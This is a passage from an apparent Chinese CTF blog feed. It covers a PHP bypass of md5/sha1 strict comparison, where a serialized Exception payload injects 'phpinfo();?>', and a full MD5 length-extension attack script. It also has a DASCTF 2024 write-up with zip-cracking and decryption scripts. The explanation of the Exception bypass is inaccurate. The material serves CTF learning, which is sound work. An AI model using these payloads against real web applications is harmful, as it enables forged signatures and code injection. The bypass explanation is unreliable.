class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">cianiao</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var1</span>;<br>    <span class="hljs-keyword">public</span> <span class="hljs-variable">$var2</span>;<br>&#125; <br><br><span class="hljs-variable">$cmd</span>=<span class="hljs-string">&quot;phpinfo();?&gt;&quot;</span>;<br><span class="hljs-variable">$a</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$cmd</span>);<br><span class="hljs-variable">$b</span> = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Exception</span>(<span class="hljs-variable">$cmd</span>,<span class="hljs-number">1</span>);<br><br><span class="hljs-variable">$tr</span> = <span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">cianiao</span>();<br><span class="hljs-variable">$tr</span>-&gt;var1=<span class="hljs-variable">$a</span>;<br><span class="hljs-variable">$tr</span>-&gt;var2=<span class="hljs-variable">$b</span>;<br><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">urlencode</span>(<span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$tr</span>));<br><br></code></pre></td></tr></table></figure><p>输入可以进行绕过，原理是采用<code>Exception</code>类绕过<code>md5</code>、<code>sha1</code>等哈希函数的强等于（<code>===</code>）检查，因为在特定情况下，PHP的类型转换机制会导致哈希碰撞被误解为相等。这种类型转换的特性可以通过抛出异常并捕获它们来实现。</p><p>ps:路径长度和包含的特殊字符（如中文字符）在序列化和反序列化过程中可能会出现编码问题，尤其是在不同环境中（如不同版本的 PHP，不同的操作系统）处理这些路径时，会导致路径解析错误或乱码，从而影响程序的正常执行。因此我的没有显示页面，但是也显示了字符串。</p><h3 id="Q4-MD5长度拓展攻击"><a href="#Q4-MD5长度拓展攻击" class="headerlink" title="Q4:MD5长度拓展攻击"></a>Q4:MD5长度拓展攻击</h3><p>先上个例题吧</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">highlight_file</span>( <span class="hljs-keyword">__FILE__</span>);<br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-variable">$secret</span>=<span class="hljs-title function_ invoke__">bin2hex</span>(<span class="hljs-title function_ invoke__">random_bytes</span>(<span class="hljs-number">16</span>));<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>);<span class="hljs-comment">//告诉你他的MD5吧</span><br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;/br&gt;&quot;</span>;<br><span class="hljs-variable">$orange</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;orange&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">substr</span>(<span class="hljs-variable">$orange</span>,-<span class="hljs-number">6</span>)!==<span class="hljs-string">&#x27;orange&#x27;</span>)&#123;<br>    <span class="hljs-keyword">die</span>(<span class="hljs-string">&quot;nonono&quot;</span>);<br>&#125;<br><span class="hljs-variable">$md5</span>=<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;md5&#x27;</span>];<br><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">md5</span>(<span class="hljs-variable">$secret</span>.<span class="hljs-variable">$orange</span>)===<span class="hljs-variable">$md5</span>)&#123;<br>    <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;good job!&quot;</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>已知secret的MD5值，secret的长度为32,orange的末尾值是orange，需要得到最后的等式，我们不讲原理，直接做题吧</p><p>贴上解题脚本</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> struct <span class="hljs-keyword">import</span> pack, unpack<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> floor, sin<br><br><br><span class="hljs-string">&quot;&quot;&quot;</span><br><span class="hljs-string">MD5 Extension Attack</span><br><span class="hljs-string">====================</span><br><span class="hljs-string"></span><br><span class="hljs-string">@refs</span><br><span class="hljs-string">https://github.com/shellfeel/hash-ext-attack</span><br><span class="hljs-string">&quot;&quot;&quot;</span><br><br><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">MD5</span>:<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        self.A, self.B, self.C, self.D = \<br>            (<span class="hljs-number">0x67452301</span>, <span class="hljs-number">0xefcdab89</span>, <span class="hljs-number">0x98badcfe</span>, <span class="hljs-number">0x10325476</span>)  <span class="hljs-comment"># initial values</span><br>        self.r: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [<span class="hljs-number">7</span>, <span class="hljs-number">12</span>, <span class="hljs-number">17</span>, <span class="hljs-number">22</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">5</span>,  <span class="hljs-number">9</span>, <span class="hljs-number">14</span>, <span class="hljs-number">20</span>] * <span class="hljs-number">4</span> + \<br>            [<span class="hljs-number">4</span>, <span class="hljs-number">11</span>, <span class="hljs-number">16</span>, <span class="hljs-number">23</span>] * <span class="hljs-number">4</span> + [<span class="hljs-number">6</span>, <span class="hljs-number">10</span>, <span class="hljs-number">15</span>, <span class="hljs-number">21</span>] * <span class="hljs-number">4</span>  <span class="hljs-comment"># shift values</span><br>        self.k: <span class="hljs-built_in">list</span>[<span class="hljs-built_in">int</span>] = \<br>            [floor(<span class="hljs-built_in">abs</span>(sin(i + <span class="hljs-number">1</span>)) * <span class="hljs-built_in">pow</span>(<span class="hljs-number">2</span>, <span class="hljs-number">32</span>))<br>             <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>)]  <span class="hljs-comment"># constants</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">_lrot</span>(<span class="hljs-params">self, x: <span class="hljs-built_in">int</span>, n: <span class="hljs-built_in">int</span></span>) -&gt; <span class="hljs-built_in">int</span>:<br>        <span class="hljs-comment"># left rotate</span><br>        <span class="hljs-keyword">return</span> (x &lt;&lt; n) | (x &gt;&gt; <span class="hljs-number">32</span> - n)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">update</span>(<span class="hljs-params">self, chunk: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># update the hash for a chunk of data (64 bytes)</span><br>        w = <span class="hljs-built_in">list</span>(unpack(<span class="hljs-string">&#x27;&lt;&#x27;</span>+<span class="hljs-string">&#x27;I&#x27;</span>*<span class="hljs-number">16</span>, chunk))<br>        a, b, c, d = self.A, self.B, self.C, self.D<br><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">64</span>):<br>            <span class="hljs-keyword">if</span> i &lt; <span class="hljs-number">16</span>:<br>                f = (b &amp; c) | ((~b) &amp; d)<br>                flag = i<br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">32</span>:<br>                f = (b &amp; d) | (c &amp; (~d))<br>                flag = (<span class="hljs-number">5</span> * i + <span class="hljs-number">1</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">elif</span> i &lt; <span class="hljs-number">48</span>:<br>                f = (b ^ c ^ d)<br>                flag = (<span class="hljs-number">3</span> * i + <span class="hljs-number">5</span>) % <span class="hljs-number">16</span><br>            <span class="hljs-keyword">else</span>:<br>                f = c ^ (b | (~d))<br>                flag = (<span class="hljs-number">7</span> * i) % <span class="hljs-number">16</span><br><br>            tmp = b + \<br>                self._lrot((a + f + self.k[i] + w[flag])<br>                           &amp; <span class="hljs-number">0xffffffff</span>, self.r[i])<br>            a, b, c, d = d, tmp &amp; <span class="hljs-number">0xffffffff</span>, b, c<br><br>        self.A = (self.A + a) &amp; <span class="hljs-number">0xffffffff</span><br>        self.B = (self.B + b) &amp; <span class="hljs-number">0xffffffff</span><br>        self.C = (self.C + c) &amp; <span class="hljs-number">0xffffffff</span><br>        self.D = (self.D + d) &amp; <span class="hljs-number">0xffffffff</span><br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">extend</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>        <span class="hljs-comment"># extend the hash with a new message (padded)</span><br>        <span class="hljs-keyword">assert</span> <span class="hljs-built_in">len</span>(msg) % <span class="hljs-number">64</span> == <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(msg), <span class="hljs-number">64</span>):<br>            self.update(msg[i:i + <span class="hljs-number">64</span>])<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">self, msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># pad the message</span><br>        length = pack(<span class="hljs-string">&#x27;&lt;Q&#x27;</span>, <span class="hljs-built_in">len</span>(msg) * <span class="hljs-number">8</span>)<br><br>        msg += <span class="hljs-string">b&#x27;\x80&#x27;</span><br>        msg += <span class="hljs-string">b&#x27;\x00&#x27;</span> * ((<span class="hljs-number">56</span> - <span class="hljs-built_in">len</span>(msg)) % <span class="hljs-number">64</span>)<br>        msg += length<br><br>        <span class="hljs-keyword">return</span> msg<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">digest</span>(<span class="hljs-params">self</span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        <span class="hljs-comment"># return the hash</span><br>        <span class="hljs-keyword">return</span> pack(<span class="hljs-string">&#x27;&lt;IIII&#x27;</span>, self.A, self.B, self.C, self.D)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">verify_md5</span>(<span class="hljs-params">test_string: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-literal">None</span>:<br>    <span class="hljs-comment"># (DEBUG function) verify the MD5 implementation</span><br>    <span class="hljs-keyword">from</span> hashlib <span class="hljs-keyword">import</span> md5 <span class="hljs-keyword">as</span> md5_hashlib<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">md5_manual</span>(<span class="hljs-params">msg: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:<br>        md5 = MD5()<br>        md5.extend(md5.padding(msg))<br>        <span class="hljs-keyword">return</span> md5.digest()<br><br>    manual_result = md5_manual(test_string).<span class="hljs-built_in">hex</span>()<br>    hashlib_result = md5_hashlib(test_string).hexdigest()<br><br>    <span class="hljs-keyword">assert</span> manual_result == hashlib_result, <span class="hljs-string">&quot;Test failed!&quot;</span><br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">attack</span>(<span class="hljs-params">message_len: <span class="hljs-built_in">int</span>, known_hash: <span class="hljs-built_in">str</span>,</span><br><span class="hljs-params">           append_str: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">tuple</span>:<br>    <span class="hljs-comment"># MD5 extension attack</span><br>    md5 = MD5()<br><br>    previous_text = md5.padding(<span class="hljs-string">b&quot;*&quot;</span> * message_len)<br>    current_text = previous_text + append_str<br><br>    md5.A, md5.B, md5.C, md5.D = unpack(<span class="hljs-string">&quot;&lt;IIII&quot;</span>, <span class="hljs-built_in">bytes</span>.fromhex(known_hash))<br>    md5.extend(md5.padding(current_text)[<span class="hljs-built_in">len</span>(previous_text):])<br><br>    <span class="hljs-keyword">return</span> current_text[message_len:], md5.digest().<span class="hljs-built_in">hex</span>()<br><br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br><br>    message_len = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known text length: &quot;</span>))<br>    known_hash = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input known hash: &quot;</span>).strip()<br>    append_text = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;[&gt;] Input append text: &quot;</span>).strip().encode()<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[*] Attacking...&quot;</span>)<br><br>    extend_str, final_hash = attack(message_len, known_hash, append_text)<br><br>    <span class="hljs-keyword">from</span> urllib.parse <span class="hljs-keyword">import</span> quote<br>    <span class="hljs-keyword">from</span> base64 <span class="hljs-keyword">import</span> b64encode<br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text:&quot;</span>, extend_str)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (URL encoded):&quot;</span>, quote(extend_str))<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Extend text (Base64):&quot;</span>, b64encode(extend_str).decode())<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;[+] Final hash:&quot;</span>, final_hash)<br></code></pre></td></tr></table></figure><p>本例题出题并不严谨，只是告诉一种情况</p><p><img src="/../../images/%E6%96%87%E7%AB%A0/%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAphp%E5%BC%BA%E5%BC%B1%E6%AF%94%E8%BE%83/4.png" alt="4"></p><p>把对应的内容填上去即可。</p>]]></content>
    
    
    <categories>
      
      <category>web</category>
      
    </categories>
    
    
    <tags>
      
      <tag>Md5</tag>
      
      <tag>sha1</tag>
      
      <tag>php</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>dasctf夏-复盘</title>
    <link href="/2024/07/21/dasctf/DASCTF%202024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/"/>
    <url>/2024/07/21/dasctf/DASCTF%202024%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/</url>
    
    <content type="html"><![CDATA[<p>孱弱，打是一打一个不吱声的，赛后跟着师傅复现一下</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><h2 id="png-master"><a href="#png-master" class="headerlink" title="png_master"></a>png_master</h2><p><img src="/../../images/DASCTF/2024%E5%A4%8F/flag.png" alt="flag"></p><p>第一部分：010分析，结尾有类似base64解密的部分提取出来解密</p><p>得到第一段内容</p><p>Congratulations on finding the first paragraph of flag, but the understanding of png is just beginning.<br><strong>flag1:DASCTF{2fd9e9ff-e27</strong></p><p>第二部分：</p><p>使用stegsolve来获得</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/1.png" alt="1"></p><p><strong>flag2:d-5405-c5f5-</strong></p><p>第三部分:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> PIL <span class="hljs-keyword">import</span> Image<br>Image=Image.<span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;C:/Users/30226/Desktop/DASCTF/tempdir/MISC附件/flag.png&#x27;</span>)<br>Image.save(<span class="hljs-string">&#x27;a.png&#x27;</span>)<br></code></pre></td></tr></table></figure><p>利用010进行对比发现IDAT多了一个很长的部分</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/2.png" alt="2"></p><p>把这部分单独读取出来，加上png头，得到图片</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/3.png" alt="3"></p><p>得到<strong>a19131f86216}</strong></p><p>最后的flag是<strong>DASCTF{2fd9e9ff-e27d-5405-c5f5-a19131f86216}</strong></p><h2 id="EZ-zip"><a href="#EZ-zip" class="headerlink" title="EZ_zip"></a>EZ_zip</h2><p>跟着复现一遍吧，感觉是提示点。</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/c.png" alt="c"></p><p>zip文件损坏的问题</p><p>使用010对两个地方进行修改，再进行解压</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/a.png" alt="a"></p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/b.png" alt="b"></p><p>后面就不明白了，直接引用套神的吧</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><code class="hljs python">![解密](../../images/DASCTF/<span class="hljs-number">2024</span>夏/解密.png)<span class="hljs-keyword">import</span> pyzipper<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">crack_zip</span>(<span class="hljs-params">zip_file_path</span>):<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        password = <span class="hljs-built_in">bytes</span>([i])<br>        <span class="hljs-keyword">try</span>:<br>            <span class="hljs-keyword">with</span> pyzipper.AESZipFile(zip_file_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> zip_ref:<br>                zip_ref.extractall(pwd=password)<br>                extracted_files = zip_ref.namelist()<br>                <span class="hljs-keyword">if</span> extracted_files:<br>                    <span class="hljs-keyword">return</span> password, extracted_files[<span class="hljs-number">0</span>]<br>        <span class="hljs-keyword">except</span>:<br>            <span class="hljs-keyword">continue</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-literal">None</span>, <span class="hljs-literal">None</span><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">main</span>():<br>    current_zip = <span class="hljs-string">&#x27;320.zip&#x27;</span><br>    all_passwords = <span class="hljs-string">&#x27;&#x27;</span><br><br>    <span class="hljs-keyword">while</span> current_zip:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Cracking <span class="hljs-subst">&#123;current_zip&#125;</span>...&#x27;</span>)<br>        password, next_zip = crack_zip(current_zip)<br>        <span class="hljs-keyword">if</span> password:<br>            all_passwords += password.<span class="hljs-built_in">hex</span>()<br>            current_zip = next_zip<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;Failed to crack <span class="hljs-subst">&#123;current_zip&#125;</span>&#x27;</span>)<br>            <span class="hljs-keyword">break</span><br><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;All passwords: <span class="hljs-subst">&#123;all_passwords&#125;</span>&#x27;</span>)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&quot;__main__&quot;</span>:<br>    main()<br><br></code></pre></td></tr></table></figure><p>得到密码</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">1bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec611bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec6<br></code></pre></td></tr></table></figure><p>并且得到一个AES-ECB.txt</p><p>明显观察到这个密码是重复的<code>11bb99580c613a87c54e12480aa7ff8c798f71ad280f6ba69d4a4425225e4ec6</code></p><p>然后得到AES的内容是<code>64ZpNmbv2Hg4Jj9bH8Kv6D3OBliD9hgyI3vZWfMDJs2TcEwVnBmH/zkBtPBE3g8e the key may be on your journey？</code></p><p>尝试用这个密码当aes的密码不对，猜测是解压顺序是从320–&gt;1，而密码顺序是1–&gt;320，因此需要反过来</p><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs markdown">c64e5e2225444a9da66b0f28ad718f798cffa70a48124ec5873a610c5899bb11<br></code></pre></td></tr></table></figure><p><img src="/../../images/DASCTF/2024%E5%A4%8F/%E8%A7%A3%E5%AF%86.png" alt="解密"></p><p><strong>DASCTF{514755c6-8280-463c-8378-a29702fc88df}</strong></p><h1 id="Re"><a href="#Re" class="headerlink" title="Re"></a>Re</h1><h2 id="DosSnake"><a href="#DosSnake" class="headerlink" title="DosSnake"></a>DosSnake</h2><p>ida打开，定位到dasctf</p><p>这段部分的内容与dasctf进行xor得到flag</p><p><img src="/../../images/DASCTF/2024%E5%A4%8F/re.png" alt="re"></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="complex-enc"><a href="#complex-enc" class="headerlink" title="complex_enc"></a>complex_enc</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> long_to_bytes<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">decrypt</span>(<span class="hljs-params">cipher, key</span>):<br>    decrypted_bits = [<span class="hljs-number">0</span>] * <span class="hljs-built_in">len</span>(key)  <span class="hljs-comment"># 初始化为与密钥相同长度的比特流</span><br><br>    <span class="hljs-comment"># 逆序遍历密钥，逐步恢复比特流</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(key) - <span class="hljs-number">1</span>, -<span class="hljs-number">1</span>, -<span class="hljs-number">1</span>):<br>        <span class="hljs-keyword">if</span> cipher &gt;= key[i]:<br>            cipher -= key[i]<br>            decrypted_bits[i] = <span class="hljs-number">1</span><br><br>    <span class="hljs-keyword">return</span> decrypted_bits<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">bits_to_bytes</span>(<span class="hljs-params">bits</span>):<br>    byte_array = <span class="hljs-built_in">bytearray</span>()<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">0</span>, <span class="hljs-built_in">len</span>(bits), <span class="hljs-number">8</span>):<br>        byte = <span class="hljs-number">0</span><br>        <span class="hljs-keyword">for</span> bit <span class="hljs-keyword">in</span> bits[i:i+<span class="hljs-number">8</span>]:<br>            byte = (byte &lt;&lt; <span class="hljs-number">1</span>) | bit<br>        byte_array.append(byte)<br>    <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(byte_array)<br><br><span class="hljs-comment"># 手动输入密文和密钥</span><br>cipher = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密文 (c): &quot;</span>))<br>key_input = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;请输入密钥 (key): &quot;</span>)<br>key = <span class="hljs-built_in">eval</span>(key_input)<br><br><span class="hljs-comment"># 解密密文</span><br>decrypted_bits = decrypt(cipher, key)<br>decrypted_bytes = bits_to_bytes(decrypted_bits)<br><br><span class="hljs-comment"># 打印解密后的内容</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted bytes (hex):&quot;</span>, decrypted_bytes.<span class="hljs-built_in">hex</span>())<br><span class="hljs-keyword">try</span>:<br>    flag = decrypted_bytes.decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag (decoded):&quot;</span>, flag)<br><span class="hljs-keyword">except</span> UnicodeDecodeError:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Decrypted flag contains non-UTF-8 bytes.&quot;</span>)<br></code></pre></td></tr></table></figure><p>背包密码</p>]]></content>
    
    
    <categories>
      
      <category>Misc</category>
      
    </categories>
    
    
    <tags>
      
      <tag>png</tag>
      
      <tag>zip</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>sql注入总结</title>
    <link href="/2024/07/16/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/07/16/%E5%AD%A6%E4%B9%A0%E6%96%87%E7%AB%A0/sql%E6%B3%A8%E5%85%A5/</url>
    
